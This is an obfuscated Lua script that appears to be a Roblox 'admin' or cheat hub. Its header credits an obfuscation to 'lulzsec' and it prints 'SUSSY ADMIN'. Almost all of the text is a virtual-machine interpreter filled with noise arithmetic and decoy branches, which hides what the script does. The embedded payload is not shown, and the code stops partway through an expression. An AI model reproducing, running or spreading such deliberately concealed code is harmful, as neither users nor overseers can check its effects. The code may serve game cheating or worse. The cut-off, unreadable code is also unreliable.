--obfuscated-by-lulzsec-
--API--SYSTEM--CREDITS-EZ-HUB


--
print("SUSSY ADMIN")

do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==4) then v13=unpack or table.unpack;v14=tonumber;v15=nil;v0=5;end if (v0==5) then function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v65=v3(v1(v30,16));if v19 then local v70=0;local v71;while true do if (v70==1) then return v71;end if (v70==0) then v71=v6(v65,v19);v19=nil;v70=1;end end else return v65;end end end);local function v20(v31,v32,v33)if v33 then local v66=690 -(98 + 592);local v67;while true do if (v66==(0 + (1423 -(1296 + 127)))) then v67=(v31/(2^(v32-(910 -(279 + 630)))))%((75 -(31 + 42))^(((v33-((6 -4) -1)) -(v32-(1 -0))) + 1));return v67-(v67%(1 + 0));end end else local v68=(1 + 1)^(v32-(1959 -(286 + 430 + 1242)));return (((v31%(v68 + v68))>=v68) and (4 -3)) or ((1454 -(423 + 1031)) + 0);end end local function v21()local v38=0;local v39;while true do if (((2768 -(770 + 599)) -(458 + 941))==v38) then v39=v2(v16,v18,v18);v18=v18 + 1 + (0 -0);v38=1 + 0;end if (v38==(483 -(473 + 1 + 8))) then return v39;end end end local function v22()local v40,v41=v2(v16,v18,v18 + (58 -(14 + 42)));v18=v18 + 2 + 0;return (v41 * 256) + v40;end local function v23()local v42=(406 -(16 + 390)) + 0;local v43;local v44;local v45;local v46;while true do if (v42==(0 + 0)) then v43,v44,v45,v46=v2(v16,v18,v18 + (4 -1));v18=v18 + (6 -(2 + 0));v42=1 -0;end if (v42==(68 -(7 + 60))) then return (v46 * (24176998 -7399782)) + (v45 * (30845 + 34691)) + (v44 * (78 + 163 + 15)) + v43;end end end local function v24()local v47=v23();local v48=v23();return (( -(1272 -(143 + 1127)) * v20(v48,1596 -(420 + 506 + 638))) + (1504 -(1416 + 87))) * ((1 + 1)^(v20(v48,21,27 + 4) -(619 + 341 + 63))) * ((((v20(v48,(1 + 0) -0,39 -19) * ((5 -3)^(1066 -(85 + 949)))) + v47)/(2^(50 + 2))) + (3 -2));end local function v25(v34)local v49;if  not v34 then local v69=(2456 -(95 + 440)) -(375 + 1546);while true do if (v69==(0 + 0)) then v34=v23();if (v34==(0 -0)) then return "";end break;end end end v49=v4(v16,v18,(v18 + v34) -(1377 -(313 + 1063)));v18=v18 + v34;local v50={};for v63=1 + 0, #v49 do v50[v63]=v3(v2(v4(v49,v63,v63)));end return v7(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51==(5 -2)) then v58=nil;while true do if (v52~=(1 + 1)) then else local v77=0 + 0;while true do if (v77~=0) then else local v99=0 -0;while true do if (v99~=(4 -3)) then else v77=741 -(403 + 337);break;end if (v99~=(0 -0)) then else for v108=2 -1,v57 do local v109=0 -0;local v110;local v111;local v112;local v113;while true do if (v109==(0 + 0)) then v110=1543 -(744 + 799);v111=nil;v109=1 + 0;end if (v109==2) then while true do if (v110~=0) then else local v125=737 -(684 + 53);while true do if ((0 -0)~=v125) then else v111=0 + 0;v112=nil;v125=1 -0;end if (v125==(219 -(153 + 65))) then v110=509 -(315 + 193);break;end end end if (v110~=(1 + 0)) then else v113=nil;while true do if (v111==(901 -(898 + 2))) then if (v112==(1 + 0)) then v113=v21()~=0;elseif (v112==2) then v113=v24();elseif (v112~=(6 -3)) then else v113=v25();end v58[v108]=v113;break;end if (v111~=(115 -(27 + 88))) then else local v132=0;while true do if (v132~=(1 + 0)) then else v111=1 + 0;break;end if ((0 + 0)==v132) then local v179=0 + 0;while true do if (v179==(0 + 0)) then v112=v21();v113=nil;v179=2 -1;end if (v179~=(1595 -(150 + 1444))) then else v132=1;break;end end end end end end break;end end break;end if (v109~=(2 -1)) then else v112=nil;v113=nil;v109=2 + 0;end end end v56[3]=v21();v99=1895 -(81 + 1813);end end end if (v77~=(1 + 0)) then else for v100=1 -0,v23() do local v101=0 -0;local v102;while true do if (v101~=0) then else v102=v21();if (v20(v102,2 -1,1 + 0)==0) then local v115=0;local v116;local v117;local v118;while true do if (v115~=(0 -0)) then else local v120=0 -0;while true do if (v120~=(1967 -(1595 + 371))) then else v115=1 -0;break;end if ((0 -0)==v120) then v116=v20(v102,2 + 0,3);v117=v20(v102,4,6);v120=1;end end end if (v115==1) then local v121=0 + 0;local v122;while true do if (v121~=(0 -0)) then else v122=0 -0;while true do if (v122==(1345 -(749 + 595))) then v115=1 + 1;break;end if (v122~=(0 + 0)) then else local v135=797 -(786 + 11);while true do if (v135~=(0 -0)) then else v118={v22(),v22(),nil,nil};if (v116==0) then local v223=0 -0;local v224;local v225;while true do if (v223==0) then v224=0;v225=nil;v223=1741 -(233 + 1507);end if (v223==(1 + 0)) then while true do if (v224==(469 -(52 + 417))) then v225=0 -0;while true do if ((1992 -(1810 + 182))~=v225) then else v118[2 + 1]=v22();v118[1067 -(500 + 563)]=v22();break;end end break;end end break;end end elseif (v116==(3 -2)) then v118[3]=v23();elseif (v116==(4 -2)) then v118[3]=v23() -((3 -1)^(52 -36));elseif (v116~=(1 + 2)) then else local v277=0;local v278;while true do if (v277~=(0 + 0)) then else v278=433 -(195 + 238);while true do if (v278~=(517 -(383 + 134))) then else v118[1506 -(585 + 918)]=v23() -((5 -3)^(850 -(150 + 684)));v118[10 -6]=v22();break;end end break;end end end v135=1;end if (v135~=(2 -1)) then else v122=1809 -(51 + 1757);break;end end end end break;end end end if (v115==2) then local v123=0 + 0;while true do if (v123~=(0 -0)) then else if (v20(v117,1 + 0,1)~=(1 + 0)) then else v118[2 + 0]=v58[v118[548 -(151 + 395)]];end if (v20(v117,2 + 0,3 -1)==1) then v118[1197 -(1091 + 103)]=v58[v118[1 + 2]];end v123=1;end if (v123==(1 + 0)) then v115=3;break;end end end if (v115~=(465 -(229 + 233))) then else if (v20(v117,8 -5,11 -8)==(2 -1)) then v118[10 -6]=v58[v118[4 + 0]];end v53[v100]=v118;break;end end end break;end end end v52=1022 -(240 + 779);break;end end end if ((1 + 2)==v52) then local v78=0;local v79;while true do if (v78==(0 + 0)) then v79=931 -(437 + 494);while true do local v103=0 -0;while true do if (v103==(0 + 0)) then if (v79~=1) then else return v56;end if (v79==(831 -(17 + 814))) then local v119=0 -0;while true do if ((0 -0)~=v119) then else for v126=1 + 0,v23() do v54[v126-(1933 -(1497 + 435))]=v28();end for v128=1,v23() do v55[v128]=v23();end v119=2 -1;end if (v119==(251 -(56 + 194))) then v79=1 + 0;break;end end end break;end end end break;end end end if (v52~=(574 -(557 + 16))) then else local v80=0;local v81;while true do if (v80~=(0 -0)) then else v81=121 -(57 + 64);while true do if (v81~=(1723 -(573 + 1150))) then else local v107=0;while true do if (v107==(726 -(234 + 492))) then v56={v53,v54,nil,v55};v57=v23();v107=1 -0;end if (v107==(1 + 0)) then v81=1 -0;break;end end end if (v81~=(896 -(246 + 649))) then else v58={};v52=2;break;end end break;end end end if (v52==(0 + 0)) then local v82=0;while true do if (v82==(0 + 0)) then v53={};v54={};v82=1216 -(274 + 941);end if (v82~=1) then else v55={};v52=1484 -(1145 + 338);break;end end end end break;end if (v51==2) then v56=nil;v57=nil;v51=8 -5;end if (v51==(456 -(454 + 2))) then v52=930 -(166 + 764);v53=nil;v51=2 -1;end if (v51~=1) then else v54=nil;v55=nil;v51=1 + 1;end end end local function v29(v35,v36,v37)local v59=0;local v60;local v61;local v62;while true do if (v59==1) then v62=v35[3];return function(...)local v72=1;local v73= -1;local v74={...};local v75=v12("#",...) -1;local function v76()local v83=v60;local v84=Const;local v85=v61;local v86=v62;local v87=v27;local v88={};local v89={};local v90={};for v96=0 -(0 + 0),v75 do if (((3960 -2350)==1610) and (v96>=v86)) then v88[v96-v86]=v74[v96 + 1];else v90[v96]=v74[v96 + (3 -2)];end end local v91=(v75-v86) + 1;local v92;local v93;while true do local v97=0 -0;local v98;while true do if (((0 + 0)==v97) or ((4488 -(30 + 305))>=4916)) then v98=0 -0;while true do if ((((9519 -5693) -(342 + 601))>(431 + 2026)) and (v98==(302 -(165 + 137)))) then local v114=0 + 0;while true do if ((v114==((0 + 0) -0)) or (((1390 + 5295) -(9756 -5291))<=((760 -(301 + 430)) + 20))) then v92=v83[v72];v93=v92[857 -(466 + 390)];v114=1 + (0 -0);end if (((602 + 2910)<(5765 -(1035 + (997 -722)))) and (v114==(1965 -(286 + 1678)))) then v98=270 -(188 + 81);break;end end end if (((745 -(162 + 94))<(3973 -(789 + 265 + 685))) and ((457 -(91 + 365))==v98)) then if ((v93<=(30 -11)) or ((2611 -(380 + 1034))<((8731 -5257) -2616))) then if (((14260 -9977)==(6866 -2583)) and (v93<=9)) then if ((3040==((4553 -2825) + 1312)) and (v93<=(91 -(49 + 38)))) then if (((2350 + 335)<((15914 -11478) + 243)) and (v93<=1)) then if ((v93==(0 + 0)) or ((1312 -(27 + 47))<=(2420 -1800))) then v90[v92[2]][v92[8 -5]]=v90[v92[6 -2]];else v90[v92[1 + 1]]=v92[10 -7]~=(37 -((7 -3) + 33));end elseif ((v93<=(5 -3)) or ((5789 -(783 + 226))<=(1158 + (2339 -(138 + 230))))) then local v138=303 -(82 + 221);local v139;local v140;while true do if ((v138==((1 + 0) -(0 -0))) or ((3236 -(533 + 1))==(2373 -990))) then while true do if ((v139==0) or ((313 + (3482 -(119 + 846)))<=(4008 -2414))) then v140=v92[2 + 0];do return v90[v140](v13(v90,v140 + 1,v92[1 + 2]));end break;end end break;end if (((2501 + 2315)>(3403 -(167 + 107))) and (v138==(0 + 0))) then v139=0;v140=nil;v138=1661 -(203 + 1457);end end elseif (((1427 + 420)==(2 + 1845)) and (v93==(515 -(471 + 41)))) then v72=v92[3 + 0];else local v180=0 -(0 + 0);local v181;local v182;local v183;local v184;while true do if (((10239 -6347)==3892) and (v180==1)) then v183=nil;v184=nil;v180=1 + 1;end if ((1103==(2297 -1194)) and (v180==(1 + 1))) then while true do if (((6672 -2280)>3693) and (v181==(2 -1))) then local v248=0 + 0;while true do if ((v248==((1375 -(154 + 136)) -((1899 -(920 + 108)) + 214))) or ((5939 -(1193 + 75))<2565)) then v184={};v183=v10({},{__index=function(v281,v282)local v288=0;local v289;local v290;while true do if ((((3749 -(425 + 162)) + 1472)==(13462 -8828)) and (v288==(559 -(211 + 347)))) then while true do if (((1863 + 1988)<=4955) and (v289==(483 -(93 + 390)))) then v290=v184[v282];return v290[1 + 0][v290[1130 -(814 + 314)]];end end break;end if (((2571 -912)>(1538 -657)) and (v288==0)) then v289=0 -0;v290=nil;v288=811 -(184 + 626);end end end,__newindex=function(v283,v284,v285)local v291=0 + 0;local v292;while true do if ((v291==0) or ((14919 -10086)<(6455 -(774 + 63 + 1111)))) then v292=v184[v284];v292[1117 -(219 + 897)][v292[2]]=v285;break;end end end});v248=1 -0;end if ((((4305 -(230 + 118)) -(423 + 1242))>=((5 -2) + 1)) and (v248==(1 + 0))) then v181=785 -(754 + 29);break;end end end if ((2855>=(2947 -2122)) and (v181==(0 -(0 -0)))) then local v249=0 -0;while true do if ((v249==(1 + 0)) or ((2251 + 1445)==(2954 -1875))) then v181=1974 -(1762 + 211);break;end if ((v249==0) or ((1189 -(448 + 296))>=(6222 -(315 + 993)))) then v182=v85[v92[3]];v183=nil;v249=1709 -(1292 + 416);end end end if ((v181==2) or ((2406 -(702 + 839))>((3755 + 561) -(242 + 548)))) then for v266=1 + 0,v92[3 + 1] do local v267=1710 -((556 -275) + 1429);local v268;local v269;while true do if ((4027>(8043 -5821)) and (v267==0)) then v268=(0 + 0) -0;v269=nil;v267=(2 -1) + 0;end if ((v267==(2 -1)) or ((1724 + 72)>=(11190 -8688))) then while true do if ((v268==(999 -(979 + 19))) or (2950<(3441 -(485 + 81)))) then if (((2582 -(1004 + 516))==((4975 -(751 + 678)) -2484)) and (v269[1 + 0]==(79 -58))) then v184[v266-(574 -(374 + (951 -752)))]={v90,v269[3]};else v184[v266-(4 -3)]={v36,v269[8 -5]};end v89[ #v89 + 1 + 0]=v184;break;end if ((v268==((0 -0) + 0)) or (1426==(16968 -12347))) then v72=v72 + (1 -0);v269=v83[v72];v268=1942 -(163 + 1778);end end break;end end end v90[v92[1 + 1]]=v29(v182,v183,v37);break;end end break;end if ((v180==(0 + 0)) or ((1390 + 2130)<(3135 -1342))) then v181=0;v182=nil;v180=1;end end end elseif ((((14021 -6886) -2229)>=(14 + 905)) and (v93<=(5 + (3 -2)))) then if ((v93>(9 -4)) or (3626<=((4125 + 1097) -3256))) then local v141=0;local v142;local v143;local v144;while true do if (((2007 -(1236 + 576))<=((3833 -(415 + 256)) -(87 + 278))) and (v141==(0 -0))) then v142=0;v143=nil;v141=1 + 0;end if ((v141==(1 -0)) or ((3889 -(222 + 251))<=(1741 -(2863 -(1174 + 701))))) then v144=nil;while true do if ((v142==(904 -(149 + 755))) or ((6664 -3936)>(5914 -(268 + 1553)))) then local v232=0;while true do if (((15484 -11585)>=(6708 -3466)) and (v232==(4 -3))) then v142=4 -3;break;end if (((6625 -(81 + 1685))>=(1355 + 2912)) and (v232==(990 -(293 + 697)))) then v143=361 -(93 + 268);v144=nil;v232=1265 -(1158 + 106);end end end if (((3619 -(284 + 208))>(1882 -1398)) and (v142==1)) then while true do if ((v143==(0 -0)) or ((2710 -((579 -361) + 50))<((2194 -645) + 633))) then v144=v92[17 -(7 + 8)];v90[v144](v90[v144 + 1]);break;end end break;end end break;end end else local v145=34 -((20 -10) + 24);local v146;local v147;local v148;local v149;local v150;while true do if ((v145==(1 + 0)) or ((5958 -3517)>=(3127 + 744))) then v148=nil;v149=nil;v145=2 + 0;end if ((4847>=(2758 -866)) and ((0 -0)==v145)) then v146=1924 -(450 + 1474);v147=nil;v145=4 -3;end if (((4665 -3047)<(5243 -(467 + 611))) and ((1 + 1)==v145)) then v150=nil;while true do if (((5801 -(344 + 1360))>(2214 + 545)) and (2==v146)) then for v245=v147,v73 do local v246=(0 -0) + 0;local v247;while true do if (((61 + (38 -26))<(16288 -11997)) and (v246==0)) then v247=0 + 0;while true do if ((((5525 -3600) -(106 + 221))==1598) and (v247==(0 + 0))) then v150=v150 + 1;v90[v245]=v148[v150];break;end end break;end end end break;end if (((1114 + 1032)<4880) and (v146==(1100 -(1078 + 21)))) then local v233=0;local v234;while true do if (((2444 + 412)<=(3935 -(81 + 67))) and (v233==0)) then v234=1522 -(1388 + (577 -443));while true do if ((1257<(5327 -(662 + 326 + 324))) and (v234==(0 + 0))) then local v286=0;while true do if ((v286==((6 -3) -2)) or (976==(4424 -(463 + 612)))) then v234=1;break;end if (((1689 + (8201 -5168))>=(676 + 2875)) and (v286==(415 -(349 + (1007 -(69 + 872)))))) then v73=(v149 + v147) -(1 -0);v150=0;v286=1 -0;end end end if (((1080 -(54 + 549 + (1821 -1345)))==v234) or ((4489 -(1350 + 347))<=(2734 -(528 + 16)))) then v146=6 -4;break;end end break;end end end if ((v146==((236 -(222 + 14)) -(0 + 0))) or (((1536 + 13212) -10968)<(3558 -(184 + 160 + 265)))) then local v235=0 -0;local v236;while true do if (((349 -123)<(300 + 79)) and (v235==(1053 -(849 + 204)))) then v236=0 + 0;while true do if (((386 + 107)<=(2414 -(1592 + 110))) and (v236==1)) then v146=777 -(591 + 185);break;end if (((2587 -(674 + (1082 -690)))==(2913 -(661 + 731))) and (v236==(421 -(270 + 151)))) then v147=v92[1016 -(138 + 128 + 748)];v148,v149=v87(v90[v147](v90[v147 + 1]));v236=2 -1;end end break;end end end end break;end end end elseif ((v93<=(1050 -(130 + 913))) or ((2050 + 336)>=(1774 + 670))) then local v151=0;local v152;local v153;local v154;while true do if ((v151==(1732 -(679 + 1053))) or ((9983 -5287)<2619)) then v152=0;v153=nil;v151=1;end if ((v151==(1 -0)) or ((4607 -(10 + 52))==(5634 -(522 + 610)))) then v154=nil;while true do if ((v152==(458 -((59 -40) + 438))) or ((1059 + 1835)>=((4784 -(277 + 482)) -(145 + 92)))) then v90[v153 + (805 -(483 + 321))]=v154;v90[v153]=v154[v92[11 -7]];break;end if ((v152==(0 -0)) or ((6576 -(627 + 1156))<(5455 -(1137 + 416)))) then v153=v92[(529 -(209 + 313)) -(14 -9)];v154=v90[v92[3]];v152=1;end end break;end end elseif ((v93==8) or (((3018 + 385) -1826)==(615 + 1186))) then local v185=0;local v186;local v187;local v188;while true do if (((1338 -(1015 + 323))==v185) or (2703<1883)) then local v226=0;while true do if (((4 + 66)==(277 -207)) and (v226==(0 + 0))) then v186=v92[6 -4];v187={v90[v186](v13(v90,v186 + (159 -((1341 -(121 + 1083)) + 21)),v73))};v226=(580 -(124 + 254)) -(106 + 95);end if (((8663 -4938)>=(1034 -(197 + 9))) and (v226==(1 + 0 + 0))) then v185=1;break;end end end if ((430==430) and (v185==1)) then v188=0;for v239=v186,v92[(1964 -667) -(1120 + (697 -(391 + 133)))] do local v240=0 + 0;local v241;while true do if ((4506==(6265 -(1629 + 130))) and (v240==(0 + 0))) then v241=(0 -0) + 0;while true do if (((46 -(9 + 37))==v241) or ((10 + 221)==(2845 -(74 + 1700)))) then v188=v188 + (2 -1);v90[v239]=v187[v188];break;end end break;end end end break;end end else v90[v92[1606 -(1130 + 474)]]= -v90[v92[1 + 2]];end elseif ((v93<=(463 -(61 + 388))) or ((2381 -(474 + 942))<(448 -267))) then if (((1102 + 1123)>=(3453 -2527)) and (v93<=11)) then if (((974 -(1300 -(510 + 304)))<(490 + 654)) and (v93==(38 -28))) then v90[v92[3 -1]]=v29(v85[v92[2 + 1]],nil,v37);else local v156=0 -0;local v157;local v158;while true do if (((2929 + 493)>(2995 -(691 + 856))) and (v156==1)) then for v220=1 + 0 + 0, #v89 do local v221=0 + 0;local v222;while true do if ((v221==(0 -0)) or (2366<(2845 -(1480 + 373)))) then v222=v89[v220];for v251=1434 -(959 + 475), #v222 do local v252=712 -(670 + 42);local v253;local v254;local v255;local v256;while true do if ((v252==(7 -5)) or ((2656 -(187 + (1140 -(667 + 247))))==(3844 -(118 + 1048)))) then while true do if ((v253==0) or (869>(3132 + 190))) then local v298=0 + 0;local v299;while true do if (((4607 + 340)==4947) and (v298==(0 -0))) then v299=0 -0;while true do if ((v299==(0 -0)) or ((2631 -942)>3006)) then local v311=897 -((1732 -1015) + 180);while true do if ((v311==(1 -0)) or ((4137 -(293 + 1185))==(6884 -(2870 + 1823)))) then v299=1 -0;break;end if ((v311==(688 -((650 -(83 + 139)) + 158 + 102))) or ((941 + 783)>=(11309 -7436))) then v254=v222[v251];v255=v254[1 -(0 -0)];v311=1 + 0;end end end if (((1919 + 798)>=(464 + 1185 + 839)) and (v299==(1 + 0))) then v253=1;break;end end break;end end end if ((v253==(1 -0)) or ((6477 -(11971 -6993))>(4313 -(99 + 594)))) then v256=v254[615 -(36 + 577)];if (((v255==v90) and (v256>=v157)) or ((3926 -(1499 + 371))>=3906)) then local v303=0;local v304;while true do if ((1318<(9022 -4642)) and (v303==(0 -0))) then v304=351 -((1730 -(570 + 1063)) + 254);while true do if ((v304==(1905 -(1145 + 760))) or (2081<(511 -(210 + 37)))) then v158[v256]=v255[v256];v254[1]=v158;break;end end break;end end end break;end end break;end if (((2542 + 300 + 317)>=(3580 -1664)) and (v252==(1 -0))) then v255=nil;v256=nil;v252=(484 -(181 + 302)) + 1;end if ((3703==3703) and (v252==(0 -(547 -(468 + 79))))) then local v279=1050 -(540 + 510);while true do if (((6195 -(320 + 1488))<=(3882 + 652)) and (v279==((3192 -(704 + 522)) -(1956 + 10)))) then v253=1148 -(374 + 774);v254=nil;v279=1 + 0;end if (((2813 -(1493 + 558))<=1540) and ((1 + 0)==v279)) then v252=2 -1;break;end end end end end break;end end end break;end if ((v156==(0 + 0)) or (3952>(10217 -5570))) then v157=v92[1456 -(207 + 1247)];v158={};v156=1 + (0 -0);end end end elseif (((3353 -(4054 -(336 + 1577)))==(1808 -(159 + 437))) and (v93<=12)) then do return;end elseif (((1359 -573)<(5346 -(985 + 105))) and (v93>(13 + 0))) then local v190=0 + 0;local v191;local v192;local v193;while true do if (((4550 -2126)<=(1242 + 2941)) and (v190==(0 + 0 + 0))) then v191=0 + 0;v192=nil;v190=1965 -(1864 + 100);end if (((2 -1)==v190) or ((21804 -17325)<=3388)) then v193=nil;while true do if ((v191==(1 + 0)) or (4793<=2468)) then while true do if ((2898<=4570) and (v192==(385 -(238 + 147)))) then v193=v92[2];v90[v193](v13(v90,v193 + 1 + 0 + 0,v92[1183 -((672 -277) + 785)]));break;end end break;end if ((v191==(0 + (532 -(255 + 277)))) or ((4193 -2353)<(1246 -(267 + 247)))) then local v257=0;while true do if ((v257==(3 -2)) or ((6021 -3489)>(4510 -(382 + 1115)))) then v191=1656 -(1538 + 117);break;end if ((3459==(4744 -(676 + 609))) and (0==v257)) then v192=1961 -(545 + 989 + 427);v193=nil;v257=1 -(0 + 0);end end end end break;end end else local v194=0;local v195;local v196;while true do if (((2808 + 2101)>(259 -172)) and (v194==(0 + 0))) then v195=0 + 0;v196=nil;v194=1 -0;end if ((v194==(1 -0)) or ((1066 -(54 + 42))==(131 + 4482))) then while true do if (((2777 + 50)>=1804) and (v195==(0 -0))) then v196=v92[2];do return v13(v90,v196,v73);end break;end end break;end end end elseif ((v93<=((29 -22) + 9)) or ((14799 -11132)<(528 + 1727))) then if ((4184>=(5187 -4079)) and (v93>(10 + 5))) then if (v90[v92[1 + 1]] or ((8266 -4542)<(3 + 34))) then v72=v72 + 1;else v72=v92[1725 -(573 + 1149)];end else v90[v92[1536 -(9 + 1525)]]=v90[v92[3]][v92[4]];end elseif ((v93<=17) or (((10922 -(94 + 442)) -6479)<=1697)) then local v160=(1208 -(274 + 934)) -0;local v161;while true do if (((1736 + 1401)>(6932 -5313)) and (v160==(574 -(206 + 368)))) then v161=v92[(619 -(367 + 246)) -4];v90[v161]=v90[v161](v90[v161 + 1]);break;end end elseif ((v93==(1336 -(288 + 1030))) or ((6212 -(191 + 1160))<=3872)) then local v197=0 -0;local v198;local v199;while true do if ((v197==(0 + 0)) or ((3178 -(847 + 237))>(214 + 2442))) then v198=0 + 0 + 0;v199=nil;v197=1;end if ((4912>=3860) and (v197==(750 -(56 + (2646 -1953))))) then while true do if ((4226>=(372 + 3193)) and (v198==(1578 -(151 + 1427)))) then v199=v92[1 + 1];v90[v199]=v90[v199](v13(v90,v199 + (1 -0),v73));break;end end break;end end else for v218=v92[2],v92[2 + 1] do v90[v218]=nil;end end elseif ((v93<=(84 -(19 + 36))) or ((2883 -(757 + 116))==(10760 -6179))) then if ((v93<=(560 -(111 + 425))) or ((2730 -(75 + 104))==228)) then if (((3535 -(387 + 1547))>(948 -599)) and (v93<=(68 -47))) then if ((3648>(1296 -(9 + 479))) and (v93==(1705 -(691 + 994)))) then if ((v90[v92[2 + 0]]~=v92[3 + 1]) or ((10169 -5559)<=(61 + 293))) then v72=v72 + (326 -(68 + 257));else v72=v92[3 + 0];end else v90[v92[1 + 1]]=v90[v92[8 -5]];end elseif (((1420 -(292 + 101))<=4332) and (v93<=(5 + 17))) then v90[v92[1 + 1]]=v37[v92[4 -1]];elseif ((v93==(1846 -(561 + 1262))) or ((11173 -7167)<(1764 -((249 -146) + (1664 -(706 + 196)))))) then local v200=0 + 0;local v201;local v202;local v203;local v204;local v205;local v206;while true do if ((v200==(2 -1)) or ((2669 -697)<=(366 + 448))) then local v227=0 + 0;while true do if (((8517 -4796)>(3994 -(664 + 188))) and (v227==(0 + 0))) then v203=nil;v204=nil;v227=203 -(173 + 29);end if ((v227==1) or ((2410 -(31 + 127))>4978)) then v200=685 -(327 + 356);break;end end end if (((2830 + 871)>=348) and (v200==(2000 -(1418 + 580)))) then v205=nil;v206=nil;v200=(264 -(176 + 83)) -2;end if (((1541 + 472)==(6307 -4294)) and (v200==((3145 -1291) -(116 + 1738)))) then v201=0 -0;v202=nil;v200=1 -0;end if ((737<=2099) and (v200==3)) then while true do if ((2291<=(6190 -(1093 + 270))) and (((5129 -3552) -(800 + 776))==v201)) then local v259=0 + 0;while true do if (((212 + 800)<=(3850 -(802 + 1040))) and (v259==(1 + 0))) then v201=2;break;end if (((754 + 2441)>=(66 + 43 + 112)) and (v259==(0 + 0))) then local v280=0;while true do if ((v280==1) or ((17622 -13563)>=(5283 -((2206 -1662) + 646)))) then v259=1;break;end if ((v280==(0 -0)) or ((9376 -4856)<(7915 -5044))) then v204=v202 + (1089 -((1734 -856) + 209));v205={v90[v202](v90[v202 + 1],v90[v204])};v280=1;end end end end end if (((3298 -((1790 -(436 + 700)) + 1039))==((10251 -6654) -1992)) and (v201==(1293 -(752 + 538)))) then if (v206 or ((3588 + 740)<=(3118 -(1187 + 48)))) then local v274=0;while true do if (((4287 -(197 + 1562))<=(7347 -3802)) and (v274==(0 -0))) then v90[v204]=v206;v72=v92[3 + 0];break;end end else v72=v72 + 1 + 0;end break;end if ((v201==(321 -((411 -162) + 72))) or (((464 + 2680) -1399)<=(672 + 656))) then local v260=0;while true do if (((5959 -4184)<4631) and (v260==(1 + 0))) then v201=2 -1;break;end if (((1209 + 2491)>=((4410 -2261) + 548)) and ((0 + 0)==v260)) then v202=v92[1 + 1];v203=v92[15 -11];v260=1;end end end if ((v201==2) or ((3106 + 405)<=(2943 -(850 + 304)))) then local v261=0 + 0;local v262;while true do if ((((2790 -(1268 + 618)) -(205 + 699))==v261) or ((795 -(4 + 37))<(8 + 12 + 439))) then v262=171 -(29 + 142);while true do if (((2461 -(490 + 185))>1177) and (v262==1)) then v201=927 -(339 + 585);break;end if (((2212 -1115)<=(2263 + 1439)) and (v262==(0 -0))) then local v300=0 + 0;while true do if ((391<=2037) and (v300==(0 -0))) then for v309=(2 -1) + 0,v203 do v90[v204 + v309]=v205[v309];end v206=v205[(1 + 0) -0];v300=223 -(107 + (2030 -(205 + 1710)));end if ((2183==2183) and (v300==(1 + 0))) then v262=1;break;end end end end break;end end end end break;end end else local v207=0;local v208;local v209;while true do if (((1943 + 1827)<(4807 -(38 + 77))) and (v207==0)) then local v228=0 + 0;while true do if (((9372 -6763)<=(1823 + 2534)) and (v228==(1650 -(443 + 707 + 499)))) then v207=1 -0;break;end if (((1165 -(956 + 203 + 6))==v228) or (1452>3725)) then v208=0 -0;v209=nil;v228=808 -(224 + 583);end end end if (((5047 -3052)<(2886 -(2 + 3 + 90))) and ((256 -((1096 -(110 + 755)) + 24))==v207)) then while true do if (((4930 -1287)<=((1442 -(48 + 74)) + 2974)) and (v208==(0 -0))) then v209=v92[5 -3];v90[v209]=v90[v209]();break;end end break;end end end elseif ((v93<=(55 -(40 -11))) or (1395<=(547 + 497))) then if ((v93==(1944 -(391 + (3322 -(149 + 1645))))) or ((5892 -(3098 + 896))>2760)) then if (((4476 -(4 + 74))>=(5085 -(717 + 634))) and (v90[v92[1 + 1]]==v92[9 -5])) then v72=v72 + 1;else v72=v92[(204 -103) -(68 + 30)];end else v90[v92[1821 -(784 + 1035)]]={};end elseif ((v93<=27) or ((6226 -4139)>=(3840 -(248 + 120)))) then v37[v92[10 -(26 -19)]]=v90[v92[5 -(1352 -(1159 + 190))]];elseif ((((8764 -(181 + 30)) -4819)>(1320 -645)) and (v93==(45 -17))) then v90[v92[2]]();elseif ( not v90[v92[2 + 0]] or ((866 + 946)>=(3616 -(385 + 494)))) then v72=v72 + 1 + 0;else v72=v92[1405 -(465 + 937)];end elseif (((301 + (275 -175))>23) and (v93<=(1934 -(1097 + 803)))) then if ((v93<=(867 -(140 + 696))) or ((4175 + 144)<(4799 -(52 + 1616)))) then if (((1448 + 1700)>=664) and (v93==(17 + 13))) then v90[v92[337 -(216 + 119)]]=v92[1253 -(895 + 319 + 36)];else local v167=1260 -(293 + 967);local v168;while true do if ((v167==0) or ((4508 -769)<=(58 -45))) then v168=v90[v92[1908 -((7271 -5433) + 66)]];if ( not v168 or ((5619 -2428)==(4432 -(327 + (1006 -608))))) then InstrPoint=InstrPoint + (810 -(701 + 45 + 63));else local v229=0;while true do if (((324 + 1651)<(4667 -(65 + (710 -(536 + 33))))) and (v229==(0 -0))) then v90[v92[9 -7]]=v168;InstrPoint=v92[719 -(365 + 351)];break;end end end break;end end end elseif ((v93<=(67 -35)) or ((3661 + 887)<758)) then local v169=0;local v170;local v171;while true do if ((v169==0) or (698==(8682 -4729))) then v170=0 + 0;v171=nil;v169=1;end if ((v169==(4 -3)) or ((5182 -(1264 + 312))<=1523)) then while true do if ((v170==(0 + 0)) or (3112==2461)) then v171=v92[943 -((1515 -(670 + 139)) + (1947 -(253 + 1459)))];v90[v171](v13(v90,v171 + 1 + 0,v73));break;end end break;end end elseif ((v93>(29 + 4)) or ((1800 -(735 + 346))<=((1073 + 786) -1387))) then local v210=0;local v211;local v212;while true do if (((11062 -6455)>(3747 -(620 + 751))) and (v210==(0 -0))) then local v230=0 + 0;while true do if (((2821 + 397)==(2452 + 766)) and ((1 + 0)==v230)) then v210=1 + 0;break;end if ((1279<(8743 -4357)) and (v230==0)) then v211=0 -0;v212=nil;v230=1 + 0;end end end if ((v210==(1 + (296 -(117 + 179)))) or (4092<(1159 -(822 + 320)))) then while true do if ((v211==(0 -0)) or ((2672 + 224 + 61)>=4529)) then v212=v92[(2 + 1) -1];do return v13(v90,v212,v212 + v92[3]);end break;end end break;end end else v90[v92[2]]=v36[v92[3]];end elseif ((v93<=(1466 -(896 + 534))) or (10==4497)) then if ((v93==((466 -351) -((808 -(333 + 448)) + 53))) or ((1142 -(77 + 7))>(1522 + 318))) then do return v90[v92[1111 -(1009 + 100)]];end elseif (((8418 -4688)>(2959 -(1081 + 831))) and (v92[2 